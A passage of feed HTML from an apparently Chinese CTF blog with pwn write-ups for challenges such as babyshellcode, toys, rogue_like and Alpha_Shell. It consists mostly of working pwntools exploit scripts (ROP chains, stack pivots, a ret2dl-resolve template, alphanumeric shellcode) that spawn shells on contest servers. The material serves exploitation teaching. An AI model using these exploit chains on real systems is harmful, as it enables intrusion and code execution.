<span class="hljs-comment"># syscall</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;</span> , <span class="hljs-built_in">len</span>(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span>+p64(canary)+p64(<span class="hljs-number">0</span>)+p))<br>payload2=<span class="hljs-string">b&#x27;&#x27;&#x27;POST /add HTTP/1.1\r</span><br><span class="hljs-string">Host: www.baidu.com\r</span><br><span class="hljs-string">User-Agent: Haha\r</span><br><span class="hljs-string">Content-Length: 1192\r</span><br><span class="hljs-string">Content: &#x27;&#x27;&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span>+p64(canary)+p64(<span class="hljs-number">0</span>)+p+<span class="hljs-string">b&#x27;\r\n&#x27;</span><br>io.send(payload2)<br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="babyshellcode"><a href="#babyshellcode" class="headerlink" title="babyshellcode"></a>babyshellcode</h2><p>利用第一次shellcode<strong>栈迁移</strong>，再通过rop链调用syscall执行read，最后重新执行shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br>shellcode = <span class="hljs-string">&quot;&quot;&quot;mov esp, esi</span><br><span class="hljs-string">ret</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>shellcode = asm(shellcode)<br>sh = asm(shellcraft.sh())<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(shellcode))<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b *(*shellcode+128)</span><br><span class="hljs-comment">#                b *(*shellcode+143)</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br><br>pop_rdi_rsi = p64(<span class="hljs-number">0x4013c9</span>)<br>syscall = p64(<span class="hljs-number">0x401332</span>)<br>mv_ecx_edx = p64(<span class="hljs-number">0x4012b1</span>)<br><br><br><br>io = remote(<span class="hljs-string">&quot;59.110.162.87&quot;</span>, <span class="hljs-number">28725</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;gift: &quot;</span>)<br>buf = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;.&quot;</span>)[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">f&quot;buf: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(buf)&#125;</span>&quot;</span>)<br>rop_chain =  pop_rdi_rsi + p64(<span class="hljs-number">0</span>) + p64(buf) + mv_ecx_edx + syscall + p64(buf)<br>io.sendafter(<span class="hljs-string">b&quot;&gt; &quot;</span>, rop_chain)<br>io.sendafter(<span class="hljs-string">b&quot;&gt; &quot;</span>, shellcode)<br>pause()<br>io.send(sh)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="riya"><a href="#riya" class="headerlink" title="riya"></a>riya</h2><p>输入n直接给shell……不是，哥们？</p><h2 id="toys"><a href="#toys" class="headerlink" title="toys"></a>toys</h2><p>官方题解需要多次栈迁移，非常麻烦，令人头大。但这题有个非预期解:<code>ret2dl</code>，套板子即可。参考<a href="http://39.104.51.85/index.php/2025/01/26/%e6%98%a5%e7%a7%8b%e6%9d%af%e5%86%ac%e5%ad%a3%e8%b5%9bday3-toys%e9%9d%9e%e9%a2%84%e6%9c%9f%e8%a7%a3/">春秋杯冬季赛day3 pwn toys非预期解 – 博的blog</a><br>板子是这样的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment"># ret2dl板子</span><br><span class="hljs-comment"># 传参分别为：伪造的link_map地址、在got表中存在函数地址的got地址、libc中system的地址、第二个参数对应的函数在libc中的偏移</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_ret2dl_data</span>(<span class="hljs-params">fake_link_map_addr, got_solved_addr, system_base, solved_base</span>):<br>    offset = system_base - solved_base<br> <br>    fake_Elf64_Dyn = <span class="hljs-string">b&quot;&quot;</span><br>    fake_Elf64_Dyn += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># d_tag  从link_map中找.rel.plt不需要用到标签， 随意设置</span><br>    fake_Elf64_Dyn += p64(fake_link_map_addr + <span class="hljs-number">0x18</span>)  <span class="hljs-comment"># d_ptr  指向伪造的Elf64_Rela结构体，由于reloc_offset也被控制为0，不需要伪造多个结构体</span><br> <br>    fake_Elf64_Rela = <span class="hljs-string">b&quot;&quot;</span><br>    fake_Elf64_Rela += p64(<br>        fake_link_map_addr - offset)  <span class="hljs-comment"># r_offset rel_addr = l-&gt;addr+reloc_offset，</span><br>    <span class="hljs-comment"># 直接指向fake_link_map所在位置令其可读写就行，offset为指向的需要的函数距离可得真实地址的函数的偏移</span><br>    fake_Elf64_Rela += p64(<span class="hljs-number">7</span>)  <span class="hljs-comment"># r_info index设置为0，最后一字节必须为7</span><br>    fake_Elf64_Rela += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># r_addend  随意设置</span><br> <br>    fake_Elf64_Sym = <span class="hljs-string">b&quot;&quot;</span><br>    fake_Elf64_Sym += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># st_name 随意设置</span><br>    fake_Elf64_Sym += <span class="hljs-string">b&#x27;AAAA&#x27;</span>  <span class="hljs-comment"># st_info, st_other, st_shndx st_other非0以避免进入重定位符号的分支</span><br>    fake_Elf64_Sym += p64(got_solved_addr - <span class="hljs-number">8</span>)  <span class="hljs-comment"># st_value 已解析函数的got表地址-8，-8体现在汇编代码中，原因不明</span><br>    fake_Elf64_Sym += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># st_size 随意设置</span><br> <br>    fake_link_map_data = <span class="hljs-string">b&quot;&quot;</span><br>    <span class="hljs-comment"># 如果offset为负数使用补码</span><br>    <span class="hljs-keyword">if</span> offset &lt; <span class="hljs-number">0</span>:<br>        fake_link_map_data += p64(<span class="hljs-number">2</span> ** <span class="hljs-number">64</span> + offset)  <span class="hljs-comment"># l_addr，伪造为两个函数的地址偏移值的补码（为负时）</span><br>    <span class="hljs-keyword">else</span>:<br>        fake_link_map_data += p64(offset)  <span class="hljs-comment"># l_addr，伪造为两个函数的地址偏移值</span><br> <br>    fake_link_map_data += fake_Elf64_Dyn<br>    fake_link_map_data += fake_Elf64_Rela<br>    fake_link_map_data += fake_Elf64_Sym<br>    fake_link_map_data += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x20</span><br>    fake_link_map_data += p64(fake_link_map_addr)  <span class="hljs-comment"># DT_STRTAB 设置为一个可读的地址</span><br>    fake_link_map_data += p64(fake_link_map_addr + <span class="hljs-number">0x30</span>)  <span class="hljs-comment"># DT_SYMTAB 指向对应结构体数组的地址</span><br>    fake_link_map_data += <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span><br>    fake_link_map_data += <span class="hljs-string">b&#x27;\x01&#x27;</span> * <span class="hljs-number">0x78</span><br>    fake_link_map_data += p64(fake_link_map_addr + <span class="hljs-number">0x8</span>)  <span class="hljs-comment"># DT_JMPREL 指向对应数组结构体的地址</span><br> <br>    <span class="hljs-keyword">return</span> fake_link_map_data<br>ret2dldata=get_ret2dl_data(fake_link_map_addr,elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>],onegadget[<span class="hljs-number">3</span>],libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>])<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*?+p64(rbp)+p64(jmp_dl)+p64(fake_link_map_addr)+p64(<span class="hljs-number">0</span>)+ret2dldata<br></code></pre></td></tr></table></figure><p>这是题解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>] <br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment"># p = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#               b *(0x401251)</span><br><span class="hljs-comment">#               &quot;&quot;&quot;)</span><br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment"># 传参分别为：伪造的link_map地址、在got表中存在函数地址的got地址、libc中system的地址、第二个参数对应的函数在libc中的地址</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_ret2dl_data</span>(<span class="hljs-params">fake_link_map_addr, got_solved_addr, system_base, solved_base</span>):<br>    offset = system_base - solved_base<br> <br>    fake_Elf64_Dyn = <span class="hljs-string">b&quot;&quot;</span><br>    fake_Elf64_Dyn += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># d_tag  从link_map中找.rel.plt不需要用到标签， 随意设置</span><br>    fake_Elf64_Dyn += p64(fake_link_map_addr + <span class="hljs-number">0x18</span>)  <span class="hljs-comment"># d_ptr  指向伪造的Elf64_Rela结构体，由于reloc_offset也被控制为0，不需要伪造多个结构体</span><br> <br>    fake_Elf64_Rela = <span class="hljs-string">b&quot;&quot;</span><br>    fake_Elf64_Rela += p64(fake_link_map_addr - offset)  <span class="hljs-comment"># r_offset rel_addr = l-&gt;addr+reloc_offset，</span><br>    <span class="hljs-comment"># 直接指向fake_link_map所在位置令其可读写就行，offset为指向的需要的函数距离可得真实地址的函数的偏移</span><br>    fake_Elf64_Rela += p64(<span class="hljs-number">7</span>)  <span class="hljs-comment"># r_info index设置为0，最后一字节必须为7</span><br>    fake_Elf64_Rela += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># r_addend  随意设置</span><br> <br>    fake_Elf64_Sym = <span class="hljs-string">b&quot;&quot;</span><br>    fake_Elf64_Sym += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># st_name 随意设置</span><br>    fake_Elf64_Sym += <span class="hljs-string">b&#x27;AAAA&#x27;</span>  <span class="hljs-comment"># st_info, st_other, st_shndx st_other非0以避免进入重定位符号的分支</span><br>    fake_Elf64_Sym += p64(got_solved_addr - <span class="hljs-number">8</span>)  <span class="hljs-comment"># st_value 已解析函数的got表地址-8，-8体现在汇编代码中，原因不明</span><br>    fake_Elf64_Sym += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># st_size 随意设置</span><br> <br>    fake_link_map_data = <span class="hljs-string">b&quot;&quot;</span><br>    <span class="hljs-comment"># 如果offset为负数使用补码</span><br>    <span class="hljs-keyword">if</span> offset &lt; <span class="hljs-number">0</span>:<br>        fake_link_map_data += p64(<span class="hljs-number">2</span> ** <span class="hljs-number">64</span> + offset)  <span class="hljs-comment"># l_addr，伪造为两个函数的地址偏移值的补码（为负时）</span><br>    <span class="hljs-keyword">else</span>:<br>        fake_link_map_data += p64(offset)  <span class="hljs-comment"># l_addr，伪造为两个函数的地址偏移值</span><br> <br>    fake_link_map_data += fake_Elf64_Dyn<br>    fake_link_map_data += fake_Elf64_Rela<br>    fake_link_map_data += fake_Elf64_Sym<br>    fake_link_map_data += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x20</span><br>    fake_link_map_data += p64(fake_link_map_addr)  <span class="hljs-comment"># DT_STRTAB 设置为一个可读的地址</span><br>    fake_link_map_data += p64(fake_link_map_addr + <span class="hljs-number">0x30</span>)  <span class="hljs-comment"># DT_SYMTAB 指向对应结构体数组的地址</span><br>    fake_link_map_data += <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span><br>    fake_link_map_data += <span class="hljs-string">b&#x27;\x01&#x27;</span> * <span class="hljs-number">0x78</span><br>    fake_link_map_data += p64(fake_link_map_addr + <span class="hljs-number">0x8</span>)  <span class="hljs-comment"># DT_JMPREL 指向对应数组结构体的地址</span><br> <br>    <span class="hljs-keyword">return</span> fake_link_map_data<br>payload1=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x80</span>+p64(<span class="hljs-number">0x404500</span>+<span class="hljs-number">0x80</span>)+p64(<span class="hljs-number">0x0000000000401251</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Data: &#x27;</span>,payload1)<br>fake_link_map_addr=<span class="hljs-number">0x4045a0</span><br>jmp_dl=<span class="hljs-number">0x401026</span><br>leave_ret=<span class="hljs-number">0x00000000004012cd</span><br>onegadget=[<span class="hljs-number">0x583dc</span>,<span class="hljs-number">0x583e3</span>,<span class="hljs-number">0xef4ce</span>,<span class="hljs-number">0xef52b</span>]<br>ret2dldata=get_ret2dl_data(fake_link_map_addr,elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>],onegadget[<span class="hljs-number">3</span>],libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>payload2=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x80</span>+p64(<span class="hljs-number">0x404500</span>)+p64(jmp_dl)+p64(fake_link_map_addr)+p64(<span class="hljs-number">0</span>)+ret2dldata<br><span class="hljs-comment"># p.debug()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;Data: &#x27;</span>,payload2)<br> <br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="rogue-like"><a href="#rogue-like" class="headerlink" title="rogue_like"></a>rogue_like</h2><p><strong>本题必须搭建远程环境才能复现(原因见下文)，可以简单地patchelf后用socat转发端口，也可以使用docker(环境:Ubuntu 18.04)</strong><br>这题大体思路是利用三次肉鸽，步骤为把tls上的canary置0-&gt;alarm got表+5(借此获取syscall的gadget)-&gt;off by null进行栈迁移+ROP。看过官方wp后应该不难理解这个大体思路。此题难点主要是这些：</p><ol><li>tls段上的canary的地址难以获得。这里可以在调试时使用<code>tls</code>指令查看，依次把tls段上的所有数据都读一遍，和<code>canary</code>值一致的就是canary的地址。</li><li>栈迁移随机性太高。这里可以将ROP链前面填满<code>ret</code>，这样成功率就会大大增加。</li><li>syscall的<code>rax</code>难以控制。但由于第二次读取时，read函数会返回读取的字符数，我们就可以利用这次read控制rax</li><li>在第三关时，程序的标准错误流和标准输出流都会被关闭，导致程序无回显。此处可以利用<code>exec 1&gt;&amp;0</code>命令，将stdout重定向到stdin，由于stdin中的内容实际上会对我们显示(shell的回显机制，你的输入会被显示到屏幕上。个别输入比如sudo的密码不会回显)，所以shell实际上会恢复正常。注意，这里只有通过远程才能实现。本地这样做是行不通的，这有可能是因为stdin只读、重定向导致冲突等原因。<strong>这也是大多数题解本地复现失败的原因之一</strong>。<br>题解如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    author: GeekCmore</span><br><span class="hljs-string">    time: 2025-02-24 19:18:38</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>filename = <span class="hljs-string">&quot;pwn1&quot;</span><br>libcname = <span class="hljs-string">&quot;./libc-2.27.so&quot;</span><br>host = <span class="hljs-string">&quot;localhost&quot;</span><br>port = <span class="hljs-number">11451</span><br>elf = context.binary = ELF(filename)<br><span class="hljs-keyword">if</span> libcname:<br>    libc = ELF(libcname)<br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.P:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br>    <span class="hljs-keyword">elif</span> args.REMOTE:<br>        <span class="hljs-keyword">return</span> remote(host, port)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript = gs)<br><br>io = start()<br><br><br>io.sendafter(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>io.sendafter(<span class="hljs-string">b&quot;Sword!\n&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x25a8</span>).encode())<br><br>io.sendafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>io.sendafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">5</span>).encode())<br>io.sendafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x602058</span>).encode())<br><br>io.sendafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>pop_rdi = <span class="hljs-number">0x4013f4</span><br>bin_sh = <span class="hljs-number">0x4019d7</span><br>ret = <span class="hljs-number">0x4007fe</span><br>pop_rsi = <span class="hljs-number">0x4013f6</span><br>pop_rdx = <span class="hljs-number">0x4013f8</span><br>pop_rsp = <span class="hljs-number">0x4013fa</span><br>payload1 = p64(ret)*(<span class="hljs-number">0x16</span>) + p64(pop_rdi) + p64(bin_sh) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0</span>) + p64(pop_rsp) + p64(<span class="hljs-number">0x602058</span>)<br>payload1 = payload1.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br>sleep(<span class="hljs-number">1</span>)<br>io.send(payload1)<br>sleep(<span class="hljs-number">1</span>)<br>io.send(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x3b</span>)<br>sleep(<span class="hljs-number">1</span>)<br><br>io.sendline(<span class="hljs-string">b&#x27;exec 1&gt;&amp;0&#x27;</span>)<br>sleep(<span class="hljs-number">1</span>)<br>io.sendline(<span class="hljs-string">b&quot;cat flag&quot;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>国城杯2024wp</title>
    <link href="/2024/12/07/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024wp/"/>
    <url>/2024/12/07/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024wp/</url>
    
    <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="调查问卷"><a href="#调查问卷" class="headerlink" title="调查问卷"></a>调查问卷</h4><p>填问卷即得flag</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h4 id="Alpha-Shell"><a href="#Alpha-Shell" class="headerlink" title="Alpha_Shell"></a>Alpha_Shell</h4><p>禁用了一大串系统调用，拿shell肯定是别想了，只能走orw。但是传统的orw路线给ban了，只能走<code>openat</code>+<code>sendfile</code>。  </p><blockquote><p>注意，使用<code>pwrite</code>是不行的，pwrite过程会调用write函数，会导致系统调用无法执行。详见源码：<a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/posix/pwrite64.c#L41">https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/posix/pwrite64.c#L41</a></p></blockquote><p>另外此题还限制了可见字符shellcode，需要用<code>alpha3</code>生成。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br>io = remote(<span class="hljs-string">&quot;125.70.243.22&quot;</span>, <span class="hljs-number">31796</span>)<br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b *(*main+428)</span><br><span class="hljs-comment">#                c</span><br><span class="hljs-comment">#                c</span><br><span class="hljs-comment">#                s</span><br><span class="hljs-comment">#                catch syscall</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>flag = <span class="hljs-number">0x100000900</span><br><br>payload = shellcraft.openat(-<span class="hljs-number">100</span>, <span class="hljs-string">&quot;flag&quot;</span>)<br>payload += shellcraft.sendfile(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">100</span>)<br>payload+= shellcraft.exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./ss&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(asm(payload))<br>    <br>sc = <span class="hljs-string">b&quot;&quot;&quot;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf\</span><br><span class="hljs-string">    1TqIHf9kDqW02DqX0D1Hu3M2E0T2I0Q030z3P3F7k\</span><br><span class="hljs-string">        4l0l1138124P0U3n060j7k0i0Z180p0k0Y090\</span><br><span class="hljs-string">            n133v2Z032k0Y0F0h09051k3X112l017o1o01&quot;&quot;&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(sc))<br>io.send(sc)<br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="vtable-hijack"><a href="#vtable-hijack" class="headerlink" title="vtable_hijack"></a>vtable_hijack</h4><p>此题可以直接打<code>__malloc_hook</code>，利用unsortedbin泄露libc+fastbin attack打malloc_hook即可拿到shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span 